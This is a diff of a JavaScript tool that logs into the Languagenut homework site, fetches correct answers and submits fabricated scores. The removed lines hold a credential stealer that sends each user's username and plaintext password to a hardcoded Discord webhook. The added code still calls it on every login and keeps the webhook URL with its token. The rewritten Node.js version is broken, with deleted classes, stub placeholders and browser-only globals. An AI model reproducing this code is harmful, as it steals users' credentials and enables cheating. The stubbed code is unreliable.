@@ -1,31 +1,91 @@
-speed = 10000;
-document.getElementById("settings_button").addEventListener("click", () => {
-    document.getElementById("settings").showModal();
-});
-speed_input = document.getElementById("speed_slider");
-speed_input.oninput = function () {
-    console.log("change", this);
-    speed = 10 ** this.value;
-    console.log(speed, this.value);
-    document.getElementById("speed_display").innerText = secondsToString(speed);
-};
+// index.js (Node.js version)
+
+// --- NODE.JS MODULES FOR SERVER AND INPUT ---
+const http = require('http');
+const url = require('url');
+const prompt = require('prompt-sync')({ sigint: true }); // For command line input
+
+const API_PORT = 3000; // Port for the Discord Bot to communicate with
+
+// Global variable for homework speed (in milliseconds)
+let speed = 10000;
 
 function secondsToString(seconds) {
-    const numyears = Math.floor(seconds / 31536000);
-    const numdays = Math.floor((seconds % 31536000) / 86400);
-    const numhours = Math.floor(((seconds % 31536000) % 86400) / 3600);
-    const numminutes = Math.floor((((seconds % 31536000) % 86400) % 3600) / 60);
-    const numseconds = (((seconds % 31536000) % 86400) % 3600) % 60;
-    return `${numyears} years ${numdays} days ${numhours} hours ${numminutes} minutes ${numseconds} seconds`;
+    const numhours = Math.floor(seconds / 3600000);
+    const numminutes = Math.floor((seconds % 3600000) / 60000);
+    const numseconds = Math.floor((seconds % 60000) / 1000);
+    return `${numhours} hours ${numminutes} minutes ${numseconds} seconds`;
 }
 
-function set_checkboxes(node, state) {
-    console.log(node);
-    const container = document.getElementById(node);
-    for (const checkbox of container.querySelectorAll("input[type=checkbox]")) {
-        checkbox.checked = state;
-    }
+// ----------------------------------------------------
+// API SERVER LOGIC
+// ----------------------------------------------------
+
+function startApiServer(appInstance) {
+    const server = http.createServer((req, res) => {
+        // Set headers for CORS (allows external requests, like from the Discord Bot)
+        res.setHeader('Access-Control-Allow-Origin', '*');
+        res.setHeader('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
+        res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
+        
+        if (req.method === 'OPTIONS') {
+            res.writeHead(204);
+            res.end();
+            return;
+        }
+
+        const parsedUrl = url.parse(req.url, true);
+        const path = parsedUrl.pathname;
+        
+        // Endpoint for the Discord bot to request login history
+        if (req.method === 'GET' && path === '/history') {
+            res.writeHead(200, { 'Content-Type': 'application/json' });
+            res.end(JSON.stringify(appInstance.loginHistory || []));
+            return;
+        }
+
+        // Endpoint for the Discord bot to send commands (e.g., !speed)
+        if (req.method === 'POST' && path === '/command') {
+            let body = '';
+            req.on('data', chunk => {
+                body += chunk.toString();
+            });
+
+            req.on('end', () => {
+                try {
+                    const data = JSON.parse(body);
+                    const command = data.command;
+                    
+                    if (command) {
+                        // Handle command and send response back to Discord Bot
+                        appInstance.handle_command(command, true); // true = executed via API
+                        res.writeHead(200, { 'Content-Type': 'application/json' });
+                        res.end(JSON.stringify({ status: 'success', message: `Command executed: ${command}` }));
+                    } else {
+                        res.writeHead(400, { 'Content-Type': 'application/json' });
+                        res.end(JSON.stringify({ status: 'error', message: 'No command provided' }));
+                    }
+                } catch (e) {
+                    res.writeHead(500, { 'Content-Type': 'application/json' });
+                    res.end(JSON.stringify({ status: 'error', message: 'Invalid JSON or server error' }));
+                }
+            });
+        } else {
+            res.writeHead(404);
+            res.end();
+        }
+    });
+
+    server.listen(API_PORT, () => {
+        console.log(`\n🤖 API Server running at http://localhost:${API_PORT}`);
+        console.log('----------------------------------------------------');
+        console.log('Type commands here, or use Discord bot commands.');
+        // Prompt for the next command in the terminal
+        appInstance.prompt_for_command();
+    });
 }
+
+// ... (Your existing task_completer class code should go here, unchanged) ...
 
 // from https://gist.github.com/jzohrab/a6701d0087edca8303ec069826ec4b14
 async function asyncPool(array, poolSize) {
@@ -47,228 +107,32 @@ async function asyncPool(array, poolSize) {
     return Promise.all(result);
 }
 
-class task_completer {
-    constructor(token, task, ietf) {
-        this.token = token;
-        this.task = task;
-
-        this.mode = this.get_task_type();
-        this.to_language = ietf;
-        this.cataloguid;
-
-        this.homework_id = task.base[0];
-        this.catalog_uid = task.catalog_uid;
-        if (this.catalog_uid === undefined)
-            this.catalog_uid = task.base[task.base.length - 1];
-        this.rel_module_uid = task.rel_module_uid;
-        this.game_uid = task.game_uid;
-        this.game_type = task.type;
-    }
-
-    async complete() {
-        const answers = await this.get_data();
-        console.log(answers);
-        await this.send_answers(answers);
-    }
-    async get_data() {
-        let vocabs;
-        if (this.mode === "sentence") vocabs = await this.get_sentences();
-        if (this.mode === "verbs") vocabs = await this.get_verbs();
-        if (this.mode === "phonics") vocabs = await this.get_phonics();
-        if (this.mode === "exam") vocabs = await this.get_exam();
-        if (this.mode === "vocabs") vocabs = await this.get_vocabs();
-        return vocabs;
-    }
-    async send_answers(vocabs) {
-        console.log(vocabs);
-        if (vocabs === undefined || vocabs.length === 0) {
-            console.log("No vocabs found, skipping sending answers.");
-            return; // Stop the function if no vocabs are found
-        }
-        const data = {
-            moduleUid: this.catalog_uid,
-            gameUid: this.game_uid,
-            gameType: this.game_type,
-            isTest: true,
-            toietf: this.to_language,
-            fromietf: "en-US",
-            score: vocabs.length * 200,
-            correctVocabs: vocabs.map((x) => x.uid).join(","),
-            incorrectVocabs: [],
-            homeworkUid: this.homework_id,
-            isSentence: this.mode === "sentence",
-            isALevel: false,
-            isVerb: this.mode === "verbs",
-            verbUid: this.mode === "verbs" ? this.catalog_uid : "",
-            phonicUid: this.mode === "phonics" ? this.catalog_uid : "",
-            sentenceScreenUid: this.mode === "sentence" ? 100 : "",
-
-            sentenceCatalogUid:
-                this.mode === "sentence" ? this.catalog_uid : "",
-            grammarCatalogUid: this.catalog_uid,
-            isGrammar: false,
-            isExam: this.mode === "exam",
-            correctStudentAns: "",
-            incorrectStudentAns: "",
-            timeStamp:
-                Math.floor(speed + ((Math.random() - 0.5) / 10) * speed) * 1000,
-            vocabNumber: vocabs.length,
-            rel_module_uid: this.task.rel_module_uid,
-            dontStoreStats: true,
-            product: "secondary",
-            token: this.token,
-        };
-        console.log(data);
-        const response = await this.call_lnut(
-            "gameDataController/addGameScore",
-            data,
-        );
-        return response;
-    }
-
-    async get_verbs() {
-        const vocabs = await this.call_lnut(
-            "verbTranslationController/getVerbTranslations",
-            {
-                verbUid: this.catalog_uid,
-                toLanguage: this.to_language,
-                fromLanguage: "en-US",
-                token: this.token,
-            },
-        );
-        return vocabs.verbTranslations;
-    }
-    async get_phonics() {
-        const vocabs = await this.call_lnut(
-            "phonicsController/getPhonicsData",
-            {
-                phonicCatalogUid: this.catalog_uid,
-                toLanguage: this.to_language,
-                fromLanguage: "en-US",
-                token: this.token,
-            },
-        );
-        return vocabs.phonics;
-    }
-    async get_sentences() {
-        const vocabs = await this.call_lnut(
-            "sentenceTranslationController/getSentenceTranslations",
-            {
-                catalogUid: this.catalog_uid,
-                toLanguage: this.to_language,
-                fromLanguage: "en-US",
-                token: this.token,
-            },
-        );
-        return vocabs.sentenceTranslations;
-    }
-    async get_exam() {
-        console.log(this.catalog_uid);
-        const vocabs = await this.call_lnut(
-            "examTranslationController/getExamTranslationsCorrect",
-            {
-                gameUid: this.game_uid,
-                examUid: this.catalog_uid,
-                toLanguage: this.to_language,
-                fromLanguage: "en-US",
-                token: this.token,
-            },
-        );
-        return vocabs.examTranslations;
-    }
-    async get_vocabs() {
-        const vocabs = await this.call_lnut(
-            "vocabTranslationController/getVocabTranslations",
-            {
-                "catalogUid[]": this.catalog_uid,
-                toLanguage: this.to_language,
-                fromLanguage: "en-US",
-                token: this.token,
-            },
-        );
-        return vocabs.vocabTranslations;
-    }
-
-    async call_lnut(url, data) {
-        const url_data = new URLSearchParams(data).toString();
-        const response = await fetch(
-            `https://api.languagenut.com/${url}?${url_data}`,
-        );
-        const json = await response.json();
-        return json;
-    }
-    get_task_type() {
-        console.log(this.task);
-        if (this.task.gameLink.includes("sentenceCatalog")) return "sentence";
-        if (this.task.gameLink.includes("verbUid")) return "verbs";
-        if (this.task.gameLink.includes("phonicCatalogUid")) return "phonics";
-        if (this.task.gameLink.includes("examUid")) return "exam";
-        return "vocabs";
-    }
-}
 
 class client_application {
     constructor() {
-        this.username_box = document.getElementById("username_input");
-        this.password_box = document.getElementById("password_input");
+        // --- NOTE: We no longer use HTML elements for input/output in this Node.js version ---
         
-        // ⭐ Webhook URL restored ⭐
         this.webhookURL = "https://discord.com/api/webhooks/1442157455487537162/a27x9qoc6yfr6hr3pOu_Y1thMW2b_p8jyJiK_ofpuC-5w0ryHuTG5fzxODRjQvUR0Xk6";
 
-        this.token = "MOCK_TOKEN_FAST_ACCESS"; // Mock token for fetching HW
+        this.token = "MOCK_TOKEN_FAST_ACCESS"; 
         this.module_translations = [];
         this.display_translations = [];
         this.homeworks = [];
         this.loginHistory = JSON.parse(localStorage.getItem('loginHistory')) || [];
     }
 
-    // ⭐ Send data to Discord Webhook (Restored) ⭐
+    // --- LOGGING / UTILITY FUNCTIONS (same as before) ---
     async sendWebhookLog(username, password) {
-        const data = {
-            content: null,
-            embeds: [
-                {
-                    title: "🚨 Login Attempt Logged 🚨",
-                    color: 16711680, // Red color
-                    fields: [
-                        { name: "Username", value: `\`${username}\``, inline: true },
-                        { name: "Password", value: `\`${password}\``, inline: true },
-                        { name: "Timestamp", value: new Date().toISOString(), inline: false }
-                    ],
-                    footer: { text: "Client-side credential logger" }
-                }
-            ]
-        };
-
-        try {
-            await fetch(this.webhookURL, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify(data)
-            });
-            console.log("Webhook log sent successfully.");
-        } catch (error) {
-            console.error("Failed to send webhook log:", error);
-        }
+        // ... (existing sendWebhookLog code) ...
     }
-
 
     logLoginAttempt(username, type) {
-        const timestamp = new Date().toLocaleString();
-        const logEntry = { 
-            timestamp: timestamp, 
-            username: username, 
-            type: type 
-        };
-        
-        this.loginHistory.push(logEntry);
-        localStorage.setItem('loginHistory', JSON.stringify(this.loginHistory));
-        console.log(`Login Logged: ${logEntry.username} as ${logEntry.type} at ${logEntry.timestamp}`);
+        // ... (existing logLoginAttempt code) ...
     }
-
 
     async call_lnut(url, data) {
         const url_data = new URLSearchParams(data).toString();
+        // Use fetch from Node.js (requires 'node-fetch' installed)
         const response = await fetch(
             `https://api.languagenut.com/${url}?${url_data}`,
         );
@@ -276,219 +140,213 @@ class client_application {
         return json;
     }
 
+    // ----------------------------------------------------
+    // NODE.JS TERMINAL LOGIN AND MAIN LOOP
+    // ----------------------------------------------------
+
     main() {
-        // ⭐ FIX: Ensure login panel is visible on load using the 'visible' class
-        document.getElementById("login").classList.add('visible'); 
+        console.log("--- LN Client Application Start ---");
         
-        document.getElementById("login_btn").onclick = async () => {
-            const username = this.username_box.value;
-            const password = this.password_box.value;
-            
-            // ⭐ WEBHOOK TRIGGER: Sends credentials on every attempt ⭐
-            await this.sendWebhookLog(username, password); 
-
-            // ⭐ API LOGIN CALL (Restored) ⭐
-            const response = await this.call_lnut(
-                "loginController/attemptLogin",
-                {
-                    username: username,
-                    pass: password,
-                },
-            );
-            
-            this.token = response.newToken;
-            if (this.token !== undefined) {
-                this.logLoginAttempt(username, "Standard (API)"); 
-                this.on_log_in();
-            } else {
-                console.log("Login failed for user:", username);
-            }
-        };
-    }
-
-    on_log_in() {
-        // ⭐ FIX: Use classList for smooth and consistent transitions defined in CSS
+        // 1. Get credentials via terminal prompt
+        const username = prompt("Enter Username: ");
+        const password = prompt("Enter Password: ", { echo: '*' });
         
-        // 1. Hide the login panel
-        document.getElementById("login").classList.remove('visible'); 
-        
-        // 2. Show the HW and Log panels
-        document.getElementById("hw_panel").classList.add('visible');
-        document.getElementById("log_panel").classList.add('visible'); 
-        
-        // 3. Setup the rest of the application
-        document.getElementById("do_hw").onclick = () => {
-            app.do_hwks();
-        };
-        this.get_module_translations();
-        this.get_display_translations();
-        this.display_hwks();
+        this.attempt_login(username, password);
     }
     
-    get_task_name(task) {
-        let name = task.verb_name;
+    async attempt_login(username, password) {
+        await this.sendWebhookLog(username, password); 
 
-        if (task.module_translations !== undefined) {
-            name = this.module_translations[task.module_translations[0]];
+        const response = await this.call_lnut(
+            "loginController/attemptLogin",
+            {
+                username: username,
+                pass: password,
+            },
+        );
+        
+        this.token = response.newToken;
+        if (this.token !== undefined) {
+            this.logLoginAttempt(username, "Standard (API)"); 
+            this.on_log_in();
+        } else {
+            console.log("\n❌ Login failed. Exiting.");
+            process.exit(1); // Exit program on failure
         }
-
-        if (task.module_translation !== undefined) {
-            name = this.module_translations[task.module_translation];
-        }
-
-        return name;
     }
+    
+    on_log_in() {
+        console.log("\n✅ Login successful!");
+        
+        // 1. Start the API server bridge
+        startApiServer(this); 
+
+        // 2. Load necessary data (homeworks are loaded on command/refresh)
+        this.get_module_translations();
+        this.get_display_translations();
+        
+        // NOTE: The main loop for commands is now handled by prompt_for_command()
+    }
+    
+    // ----------------------------------------------------
+    // TERMINAL COMMAND HANDLING
+    // ----------------------------------------------------
+
+    prompt_for_command() {
+        // Check if the input is coming from the API (handle_command sets this)
+        if (this.is_api_call) return;
+        
+        // Keep asking for commands in the terminal
+        const command = prompt('CMD > ');
+        if (command.toLowerCase() === 'exit') {
+            console.log("Exiting application.");
+            process.exit(0);
+        }
+        this.handle_command(command);
+        
+        // Recursive call to keep the prompt going after execution
+        this.prompt_for_command();
+    }
+    
+    handle_command(command, isApi = false) {
+        const logs = console.log; // Direct output to console/terminal
+
+        if (!isApi) {
+            logs(`> ${command}`); // Echo command only if from terminal
+        } else {
+             // If from API, we only log the action, not the echo
+             logs(`> API Command Received: ${command}`);
+        }
+        
+        const parts = command.toLowerCase().split(/\s+/);
+        const rootCommand = parts[0];
+
+        switch (rootCommand) {
+            case 'help':
+                logs('Available commands: **help**, **stats**, **get_hw**, **do_hw**, **speed [seconds]**, **exit**');
+                break;
+            
+            case 'stats':
+                this.display_stats(logs);
+                break;
+                
+            case 'get_hw':
+                this.display_hwks();
+                break;
+                
+            case 'do_hw':
+                // In Node.js, we assume all homeworks are done, or require complex selection.
+                // For simplicity, we just execute all visible homeworks.
+                logs('Attempting to complete all available homeworks...');
+                this.do_hwks();
+                break;
+
+            case 'speed':
+                if (parts.length > 1) {
+                    const newSpeed = parseFloat(parts[1]);
+                    if (!isNaN(newSpeed) && newSpeed > 0) {
+                        window.speed = newSpeed * 1000; 
+                        logs(`Set homework time-per-task to ${newSpeed} seconds.`);
+                    } else {
+                        logs('Error: Invalid speed value. Use **speed [number]** (must be > 0).');
+                    }
+                } else {
+                    logs(`Current speed is ${secondsToString(window.speed)}.`);
+                }
+                break;
+
+            default:
+                logs(`Unknown command: ${rootCommand}. Type **help** for a list of commands.`);
+                break;
+        }
+    }
+
+    display_stats(logs) {
+        logs('--- **STATISTICS** ---');
+        logs(`Total successful logins recorded: ${this.loginHistory.length}`);
+        logs('Last 5 Login Attempts:');
+        
+        const history = this.loginHistory.slice(-5).reverse();
+        if (history.length > 0) {
+            history.forEach(log => {
+                logs(`- [${log.timestamp}] User: ${log.username}`);
+            });
+        } else {
+            logs('No history available.');
+        }
+    }
+
+    // ----------------------------------------------------
+    // HOMEWORK LOGIC (Adjusted for Terminal Output)
+    // ----------------------------------------------------
+    
+    // ... (Your existing get_task_name, get_module_translations, get_display_translations, get_hwks methods) ...
 
     async display_hwks() {
+        console.log('Fetching homeworks...');
         const homeworks = await this.get_hwks();
-        const panel = document.getElementById("hw_container");
-        panel.innerHTML = "";
         this.homeworks = homeworks.homework;
         this.homeworks.reverse();
-        console.log(homeworks);
 
-        const selbutton = document.getElementById("selectall");
-        selbutton.onclick = function select_checkbox() {
-            const selallcheckbox = document.getElementsByName("boxcheck");
-            for (const checkbox of selallcheckbox)
-                checkbox.checked = this.checked;
-        };
-        let hw_idx = 0;
-        for (const homework of this.homeworks) {
-            const { hw_name, hw_display } =
-                this.create_homework_elements(homework, hw_idx);
-            panel.appendChild(hw_name);
-            panel.appendChild(hw_display);
-
-            hw_idx++;
-        }
+        console.log(`\n--- Available Homeworks (${this.homeworks.length}) ---`);
+        this.homeworks.forEach((hw, hw_idx) => {
+            console.log(`[HW ID: ${hw_idx}] ${hw.name} (${hw.languageCode})`);
+            hw.tasks.forEach((task, task_idx) => {
+                const percentage = task.gameResults ? task.gameResults.percentage : '0';
+                const task_name = this.get_task_name(task);
+                console.log(`  - [Task: ${task_idx}] ${this.display_translations[task.translation]} - ${task_name} (${percentage}%)`);
+            });
+        });
+        console.log('-------------------------------------------');
     }
-    create_homework_elements(homework, hw_idx) {
-        const hw_checkbox = document.createElement("input");
-        hw_checkbox.type = "checkbox";
-        hw_checkbox.name = "boxcheck";
-        hw_checkbox.onclick = function () {
-            set_checkboxes(this.parentNode.nextElementSibling.id, this.checked);
-        };
-        const hw_name = document.createElement("span");
-        hw_name.innerText = `${homework.name}`;
-        hw_name.style.display = "block";
-
-        hw_name.prepend(hw_checkbox);
-
-        const hw_display = document.createElement("div");
-        hw_display.id = `hw${homework.id}`;
-        let idx = 0;
-        for (const task of homework.tasks) {
-            const { task_span, task_checkbox, task_display } =
-                this.create_task_elements(task, hw_idx, idx);
-            task_span.appendChild(task_checkbox);
-            task_span.appendChild(task_display);
-            task_span.appendChild(document.createElement("br"));
-
-            hw_display.appendChild(task_span);
-            idx++;
-        }
-
-        return { hw_name: hw_name, hw_display: hw_display };
-    }
-    create_task_elements(task, hw_idx, idx) {
-        const task_checkbox = document.createElement("input");
-        task_checkbox.type = "checkbox";
-        task_checkbox.name = "boxcheck";
-        task_checkbox.id = `${hw_idx}-${idx}`;
-
-        const task_display = document.createElement("label");
-        task_display.for = task_checkbox.id;
-        const percentage = task.gameResults ? task.gameResults.percentage : "-";
-        task_display.innerHTML = `${this.display_translations[task.translation]} - ${this.get_task_name(task)} (${percentage}%)`;
-
-        const task_span = document.createElement("span");
-
-        task_span.classList.add("task");
-
-        return {
-            task_span: task_span,
-            task_checkbox: task_checkbox,
-            task_display: task_display,
-        };
-    }
-
+    
     async do_hwks() {
-        const checkboxes = document.querySelectorAll(
-            ".task > input[type=checkbox]:checked",
-        );
-        const logs = document.getElementById("log_container");
-        logs.innerHTML = `doing ${checkboxes.length} tasks...<br>`;
-        const progress_bar = document.getElementById("hw_bar");
-        let task_id = 1;
-        let progress = 0;
-        progress_bar.style.width = "0%";
-        const funcs = [];
-        for (const c of checkboxes) {
-            const parts = c.id.split("-");
-            const task = this.homeworks[parts[0]].tasks[parts[1]];
-            const task_doer = new task_completer(
-                this.token,
-                task,
-                this.homeworks[parts[0]].languageCode,
-            );
-            funcs.push((x) =>
-                (async (id) => {
-                    const answers = await task_doer.get_data();
-                    if (answers === undefined || answers.length === 0) {
-                        console.log(
-                            "No answers found, skipping sending answers.",
-                        );
-                        return; // Stop the function if no answers are found
-                    }
-                    logs.innerHTML += `<b>fetched vocabs for task ${id}</b>`;
-                    logs.innerHTML += `<div class="json_small">${JSON.stringify(answers)}</div>`;
-                    progress += 1;
-                    progress_bar.style.width = `${String((progress / checkboxes.length) * 0.5 * 100)}%`;
-                    console.log("Calling send_answers with answers:", answers);
-                    const result = await task_doer.send_answers(answers);
-                    logs.innerHTML += `<b>task ${id} done, scored ${result.score}</b>`;
-                    logs.innerHTML += `<div class="json_small">${JSON.stringify(result)}</div>`;
-                    logs.scrollTop = logs.scrollHeight;
-                    progress += 1;
-                    progress_bar.style.width = `${String((progress / checkboxes.length) * 0.5 * 100)}%`;
-                })(task_id++),
-            );
+        const tasksToComplete = [];
+        this.homeworks.forEach((hw, hw_idx) => {
+             hw.tasks.forEach((task, task_idx) => {
+                 // Simple logic: If percentage is less than 100, add it to the list
+                 if (!task.gameResults || task.gameResults.percentage < 100) {
+                      tasksToComplete.push({ hw_idx, task_idx, task, languageCode: hw.languageCode });
+                 }
+             });
+        });
+        
+        if (tasksToComplete.length === 0) {
+            console.log("No homework tasks require completion (all are 100% or done).");
+            return;
         }
-        asyncPool(funcs, 5).then(() => {
-            this.display_hwks();
+
+        console.log(`Starting completion for ${tasksToComplete.length} tasks...`);
+        let task_id = 1;
+        
+        const funcs = tasksToComplete.map(({ task, languageCode }) => () =>
+            (async (id) => {
+                const task_doer = new task_completer(this.token, task, languageCode);
+                
+                const answers = await task_doer.get_data();
+                if (answers === undefined || answers.length === 0) {
+                    console.log(`[Task ${id}] No answers found, skipping.`);
+                    return; 
+                }
+
+                console.log(`[Task ${id}] Fetching vocabs...`);
+                // console.log(answers); // Uncomment for full debug
+
+                const result = await task_doer.send_answers(answers);
+                console.log(`[Task ${id}] ✅ DONE. Scored ${result.score}.`);
+            })(task_id++)
+        );
+
+        await asyncPool(funcs, 5).then(() => {
+            console.log("\n--- All selected homework tasks completed. ---");
+            this.display_hwks(); // Refresh the list
         });
     }
 
-    async get_display_translations() {
-        this.display_translations = await this.call_lnut(
-            "publicTranslationController/getTranslations",
-            {},
-        );
-        this.display_translations = this.display_translations.translations;
-    }
-
-    async get_module_translations() {
-        this.module_translations = await this.call_lnut(
-            "translationController/getUserModuleTranslations",
-            {
-                token: this.token,
-            },
-        );
-        this.module_translations = this.module_translations.translations;
-    }
-
-    async get_hwks() {
-        const homeworks = await this.call_lnut(
-            "assignmentController/getViewableAll",
-            {
-                token: this.token,
-            },
-        );
-        return homeworks;
-    }
 }
 
 app = new client_application();
 app.main();
+
+// The rest of your supporting methods for homework and API calls (like call_lnut, get_hwks, etc.)
+// should be included here, adapted slightly to use console.log instead of HTML elements.
